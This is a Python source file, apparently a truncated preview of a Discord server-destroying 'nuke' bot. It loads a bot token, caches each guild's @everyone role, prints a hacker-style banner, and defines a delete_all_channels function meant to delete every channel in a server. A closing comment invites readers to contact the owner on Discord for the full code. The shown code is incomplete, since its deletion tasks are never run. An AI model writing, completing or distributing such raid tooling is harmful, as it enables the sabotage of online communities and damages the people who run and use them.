import os
os.system('pip install discord')
os.system('pip install colorama')
import discord
from discord.ext import commands
from dotenv import load_dotenv
import asyncio
import random
from colorama import Fore, Style, init

init(autoreset=True)

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix=["$", ",", ".", ";"], intents=intents)

print(Fore.RED + """
                                               
                _/                _/           
     _/_/_/  _/_/_/_/    _/_/        _/_/_/    
  _/_/        _/      _/_/_/_/  _/  _/    _/   
     _/_/    _/      _/        _/  _/    _/    
_/_/_/        _/_/    _/_/_/  _/  _/    _/     
                                               
""" + Style.RESET_ALL)

print(Fore.YELLOW + "            - est. 2023" + Style.RESET_ALL)

role_cache = {}

@bot.event
async def on_ready():
    print(Fore.GREEN + f"✅ Logged in as {bot.user}" + Style.RESET_ALL)
    await bot.change_presence(activity=discord.Game(name="/help for assistance and instructions."))
    for guild in bot.guilds:
        role = discord.utils.get(guild.roles, name="@everyone")
        if role:
            role_cache[guild.id] = role
            print(Fore.CYAN + f"Cached @everyone role for guild: {guild.name}" + Style.RESET_ALL)


# --- Utilities ---

async def delete_all_channels(guild):
    tasks = [channel.delete() for channel in guild.channels]

# This is just the preview. To view the whole code, contact the owner of this repository.
# - kino.dyers.eve [Discord]
